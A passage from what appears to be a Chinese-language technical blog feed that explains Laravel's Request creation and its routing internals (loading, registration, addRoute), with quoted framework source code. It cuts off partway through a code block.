$this-&gt;pathInfo = null;</span><br><span class="line">        $this-&gt;requestUri = null;</span><br><span class="line">        $this-&gt;baseUrl = null;</span><br><span class="line">        $this-&gt;basePath = null;</span><br><span class="line">        $this-&gt;method = null;</span><br><span class="line">        $this-&gt;format = null;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到Symfony Request类除了上边说到的那几个，还有很多属性，这些属性在一起构成了对HTTP请求完整的抽象，我们可以通过实例属性方便地访问<code>Method</code>，<code>Charset</code>等这些HTTP请求的属性。</p><p>拿到Symfony Request实例后， Laravel会克隆这个实例并重设其中的一些属性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Http</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span> <span class="keyword">extends</span> ....</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//在Symfony request instance的基础上创建Request实例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createFromBase</span><span class="params">(SymfonyRequest $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($request <span class="keyword">instanceof</span> <span class="keyword">static</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $request;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $content = $request-&gt;content;</span><br><span class="line"></span><br><span class="line">        $request = (<span class="keyword">new</span> <span class="keyword">static</span>)-&gt;duplicate(</span><br><span class="line">            $request-&gt;query-&gt;all(), $request-&gt;request-&gt;all(), $request-&gt;attributes-&gt;all(),</span><br><span class="line">            $request-&gt;cookies-&gt;all(), $request-&gt;files-&gt;all(), $request-&gt;server-&gt;all()</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $request-&gt;content = $content;</span><br><span class="line"></span><br><span class="line">        $request-&gt;request = $request-&gt;getInputSource();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $request;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">duplicate</span><span class="params">(array $query = null, array $request = null, array $attributes = null, array $cookies = null, array $files = null, array $server = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::duplicate($query, $request, $attributes, $cookies, <span class="keyword">$this</span>-&gt;filterFiles($files), $server);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Symfony Request中的 duplicate方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">duplicate</span><span class="params">(array $query = null, array $request = null, array $attributes = null, array $cookies = null, array $files = null, array $server = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $dup = <span class="keyword">clone</span> <span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> !== $query) &#123;</span><br><span class="line">            $dup-&gt;query = <span class="keyword">new</span> ParameterBag($query);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> !== $request) &#123;</span><br><span class="line">            $dup-&gt;request = <span class="keyword">new</span> ParameterBag($request);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> !== $attributes) &#123;</span><br><span class="line">            $dup-&gt;attributes = <span class="keyword">new</span> ParameterBag($attributes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> !== $cookies) &#123;</span><br><span class="line">            $dup-&gt;cookies = <span class="keyword">new</span> ParameterBag($cookies);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> !== $files) &#123;</span><br><span class="line">            $dup-&gt;files = <span class="keyword">new</span> FileBag($files);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> !== $server) &#123;</span><br><span class="line">            $dup-&gt;server = <span class="keyword">new</span> ServerBag($server);</span><br><span class="line">            $dup-&gt;headers = <span class="keyword">new</span> HeaderBag($dup-&gt;server-&gt;getHeaders());</span><br><span class="line">        &#125;</span><br><span class="line">        $dup-&gt;languages = <span class="keyword">null</span>;</span><br><span class="line">        $dup-&gt;charsets = <span class="keyword">null</span>;</span><br><span class="line">        $dup-&gt;encodings = <span class="keyword">null</span>;</span><br><span class="line">        $dup-&gt;acceptableContentTypes = <span class="keyword">null</span>;</span><br><span class="line">        $dup-&gt;pathInfo = <span class="keyword">null</span>;</span><br><span class="line">        $dup-&gt;requestUri = <span class="keyword">null</span>;</span><br><span class="line">        $dup-&gt;baseUrl = <span class="keyword">null</span>;</span><br><span class="line">        $dup-&gt;basePath = <span class="keyword">null</span>;</span><br><span class="line">        $dup-&gt;method = <span class="keyword">null</span>;</span><br><span class="line">        $dup-&gt;format = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!$dup-&gt;get(<span class="string">'_format'</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;get(<span class="string">'_format'</span>)) &#123;</span><br><span class="line">            $dup-&gt;attributes-&gt;set(<span class="string">'_format'</span>, <span class="keyword">$this</span>-&gt;get(<span class="string">'_format'</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!$dup-&gt;getRequestFormat(<span class="keyword">null</span>)) &#123;</span><br><span class="line">            $dup-&gt;setRequestFormat(<span class="keyword">$this</span>-&gt;getRequestFormat(<span class="keyword">null</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $dup;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>创建完Request对象后， Laravel的Http Kernel会接着往下执行：加载服务提供器引导Laravel应用、启动应用、让Request经过基础的中间件、通过Router匹配查找Request对应的路由、执行匹配到的路由、Request经过路由上到中间件到达控制器方法。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>随着Request最终到达对应的控制器方法后它的使命基本上也就完成了， 在控制器方法里从Request中获取输入参数然后执行应用的某一业务逻辑获得结果，结果会被转化成Response响应对象返回给发起请求的客户端。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>laravel学习之路由</title>
      <link href="/2018/10/17/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E7%94%B1/"/>
      <url>/2018/10/17/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E7%94%B1/</url>
      
        <content type="html"><![CDATA[<p>laravel重要组件-路由了解一下</p><a id="more"></a><h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><p>自定义路由大概是laravel很亮眼的一个功能了，无论URI对应的处理程序是一个简单的闭包还是说是控制器方法没有对应的路由外界都访问不到他们，今天我们就来看看Laravel是如何来设计和实现路由的。</p><h2 id="路由定义"><a href="#路由定义" class="headerlink" title="路由定义"></a>路由定义</h2><p>我们在路由文件里通常是向下面这样来定义路由的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Route::get(<span class="string">'/user'</span>, <span class="string">'UsersController@index'</span>);</span><br></pre></td></tr></table></figure></p><p>通过上面的路由我们可以知道，客户端通过以HTTP GET方式来请求 URI “/user”时，Laravel会把请求最终派发给UsersController类的index方法来进行处理，然后在index方法中返回响应给客户端。</p><p>上面注册路由时用到的Route类在Laravel里叫门面（Facade），它提供了一种简单的方式来访问绑定到服务容器里的服务router，至于facade我们在上一篇文章已经提过了</p><p>router这个服务是在实例化应用程序Application时在构造方法里通过注册RoutingServiceProvider时绑定到服务容器里的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//bootstrap/app.php</span><br><span class="line">   <span class="variable">$app</span> = new Illuminate\Foundation\Application(</span><br><span class="line">       realpath(__DIR__.<span class="string">'/../'</span>)</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">//Application: 构造方法</span><br><span class="line">   public <span class="keyword">function</span> __construct(<span class="variable">$basePath</span> = null)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$basePath</span>) &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;setBasePath(<span class="variable">$basePath</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$this</span>-&gt;registerBaseBindings();</span><br><span class="line"></span><br><span class="line">       <span class="variable">$this</span>-&gt;registerBaseServiceProviders();</span><br><span class="line"></span><br><span class="line">       <span class="variable">$this</span>-&gt;registerCoreContainerAliases();</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   //Application: 注册基础的服务提供器</span><br><span class="line">   protected <span class="keyword">function</span> registerBaseServiceProviders()</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="variable">$this</span>-&gt;register(new EventServiceProvider(<span class="variable">$this</span>));</span><br><span class="line"></span><br><span class="line">       <span class="variable">$this</span>-&gt;register(new LogServiceProvider(<span class="variable">$this</span>));</span><br><span class="line"></span><br><span class="line">       <span class="variable">$this</span>-&gt;register(new RoutingServiceProvider(<span class="variable">$this</span>));</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   //\Illuminate\Routing\RoutingServiceProvider: 绑定router到服务容器</span><br><span class="line">   protected <span class="keyword">function</span> registerRouter()</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="variable">$this</span>-&gt;app-&gt;singleton(<span class="string">'router'</span>, <span class="keyword">function</span> (<span class="variable">$app</span>) &#123;</span><br><span class="line">           <span class="built_in">return</span> new Router(<span class="variable">$app</span>[<span class="string">'events'</span>], <span class="variable">$app</span>);</span><br><span class="line">       &#125;);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p> 通过上面的代码我们知道了Route调用的静态方法都对应于<code>\Illuminate\Routing\Router</code>类里的方法，Router这个类里包含了与路由的注册、寻址、调度相关的方法。</p><p>下面我们从路由的加载，注册，寻址这几个阶段来看一下laravel里是如何实现这些的。</p><h2 id="路由加载"><a href="#路由加载" class="headerlink" title="路由加载"></a>路由加载</h2><p>注册路由前需要先加载路由文件，路由文件的加载是在<code>App\Providers\RouteServiceProvider</code>这个服务器提供者的boot方法里加载的:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RouteServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::boot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">map</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mapApiRoutes();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;mapWebRoutes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mapWebRoutes</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Route::middleware(<span class="string">'web'</span>)</span><br><span class="line">             -&gt;namespace(<span class="keyword">$this</span>-&gt;namespace)</span><br><span class="line">             -&gt;group(base_path(<span class="string">'routes/web.php'</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mapApiRoutes</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Route::prefix(<span class="string">'api'</span>)</span><br><span class="line">             -&gt;middleware(<span class="string">'api'</span>)</span><br><span class="line">             -&gt;namespace(<span class="keyword">$this</span>-&gt;namespace)</span><br><span class="line">             -&gt;group(base_path(<span class="string">'routes/api.php'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Support</span>\<span class="title">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RouteServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setRootControllerNamespace();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;app-&gt;routesAreCached()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadCachedRoutes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadRoutes();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;app-&gt;booted(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;app[<span class="string">'router'</span>]-&gt;getRoutes()-&gt;refreshNameLookups();</span><br><span class="line">                <span class="keyword">$this</span>-&gt;app[<span class="string">'router'</span>]-&gt;getRoutes()-&gt;refreshActionLookups();</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">loadCachedRoutes</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;booted(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">require</span> <span class="keyword">$this</span>-&gt;app-&gt;getCachedRoutesPath();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">loadRoutes</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="string">'map'</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app-&gt;call([<span class="keyword">$this</span>, <span class="string">'map'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span> <span class="keyword">extends</span> <span class="title">Container</span> <span class="keyword">implements</span> <span class="title">ApplicationContract</span>, <span class="title">HttpKernelInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">routesAreCached</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>[<span class="string">'files'</span>]-&gt;exists(<span class="keyword">$this</span>-&gt;getCachedRoutesPath());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCachedRoutesPath</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bootstrapPath().<span class="string">'/cache/routes.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>laravel 首先去寻找路由的缓存文件，没有缓存文件再去进行加载路由。缓存文件一般在 bootstrap/cache/routes.php 文件中。<br>方法loadRoutes会调用map方法来加载路由文件里的路由，map这个函数在<code>App\Providers\RouteServiceProvider</code>类中，这个类继承自<code>Illuminate\Foundation\Support\Providers\RouteServiceProvider</code>。通过map方法我们能看到laravel将路由分为两个大组：api、web。这两个部分的路由分别写在两个文件中：routes/web.php、routes/api.php。</p><p><strong><em>Laravel5.5里是把路由分别放在了几个文件里，之前的版本是在app/Http/routes.php文件里。放在多个文件里能更方便地管理API路由和与WEB路由</em></strong></p><h2 id="路由注册"><a href="#路由注册" class="headerlink" title="路由注册"></a>路由注册</h2><p>我们通常都是用Route这个Facade调用静态方法get, post, head, options, put, patch, delete……等来注册路由，上面我们也说了这些静态方法其实是调用了Router类里的方法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> get(<span class="variable">$uri</span>, <span class="variable">$action</span> = null)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$this</span>-&gt;addRoute([<span class="string">'GET'</span>, <span class="string">'HEAD'</span>], <span class="variable">$uri</span>, <span class="variable">$action</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   public <span class="keyword">function</span> post(<span class="variable">$uri</span>, <span class="variable">$action</span> = null)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$this</span>-&gt;addRoute(<span class="string">'POST'</span>, <span class="variable">$uri</span>, <span class="variable">$action</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>可以看到路由的注册统一都是由router类的addRoute方法来处理的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">//注册路由到RouteCollection</span><br><span class="line">    protected <span class="keyword">function</span> addRoute(<span class="variable">$methods</span>, <span class="variable">$uri</span>, <span class="variable">$action</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;routes-&gt;add(<span class="variable">$this</span>-&gt;createRoute(<span class="variable">$methods</span>, <span class="variable">$uri</span>, <span class="variable">$action</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //创建路由</span><br><span class="line">    protected <span class="keyword">function</span> createRoute(<span class="variable">$methods</span>, <span class="variable">$uri</span>, <span class="variable">$action</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;actionReferencesController(<span class="variable">$action</span>)) &#123;</span><br><span class="line">        //controller@action类型的路由在这里要进行转换</span><br><span class="line">            <span class="variable">$action</span> = <span class="variable">$this</span>-&gt;convertToControllerAction(<span class="variable">$action</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$route</span> = <span class="variable">$this</span>-&gt;newRoute(</span><br><span class="line">            <span class="variable">$methods</span>, <span class="variable">$this</span>-&gt;prefix(<span class="variable">$uri</span>), <span class="variable">$action</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;hasGroupStack()) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;mergeGroupAttributesIntoRoute(<span class="variable">$route</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$this</span>-&gt;addWhereClausesToRoute(<span class="variable">$route</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$route</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    protected <span class="keyword">function</span> convertToControllerAction(<span class="variable">$action</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_string(<span class="variable">$action</span>)) &#123;</span><br><span class="line">            <span class="variable">$action</span> = [<span class="string">'uses'</span> =&gt; <span class="variable">$action</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! empty(<span class="variable">$this</span>-&gt;groupStack)) &#123;        </span><br><span class="line">            <span class="variable">$action</span>[<span class="string">'uses'</span>] = <span class="variable">$this</span>-&gt;prependGroupNamespace(<span class="variable">$action</span>[<span class="string">'uses'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$action</span>[<span class="string">'controller'</span>] = <span class="variable">$action</span>[<span class="string">'uses'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$action</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>注册路由时传递给addRoute的第三个参数action可以闭包、字符串或者数组，数组就是类似<code>[&#39;uses&#39; =&gt; &#39;Controller@action&#39;, &#39;middleware&#39; =&gt; &#39;...&#39;]</code>这种形式的。如果action是<code>Controller@action</code>类型的路由将被转换为action数组, convertToControllerAction执行完后action的内容为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[</span><br><span class="line"><span class="string">'uses'</span> =&gt; <span class="string">'App\Http\Controllers\SomeController@someAction'</span>,</span><br><span class="line"><span class="string">'controller'</span> =&gt; <span class="string">'App\Http\Controllers\SomeController@someAction'</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>可以看到把命名空间补充到了控制器的名称前组成了完整的控制器类名，action数组构建完成接下里就是创建路由了，创建路由即用指定的HTTP请求方法、URI字符串和action数组来创建<code>\Illuminate\Routing\Route</code>类的实例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="keyword">function</span> newRoute(<span class="variable">$methods</span>, <span class="variable">$uri</span>, <span class="variable">$action</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="built_in">return</span> (new Route(<span class="variable">$methods</span>, <span class="variable">$uri</span>, <span class="variable">$action</span>))</span><br><span class="line">                   -&gt;setRouter(<span class="variable">$this</span>)</span><br><span class="line">                   -&gt;setContainer(<span class="variable">$this</span>-&gt;container);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>路由创建完成后将Route添加到RouteCollection中去：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="keyword">function</span> addRoute(<span class="variable">$methods</span>, <span class="variable">$uri</span>, <span class="variable">$action</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$this</span>-&gt;routes-&gt;add(<span class="variable">$this</span>-&gt;createRoute(<span class="variable">$methods</span>, <span class="variable">$uri</span>, <span class="variable">$action</span>));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>router的$routes属性就是一个RouteCollection对象，添加路由到RouteCollection对象时会更新RouteCollection对象的routes、allRoutes、nameList和actionList属性<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 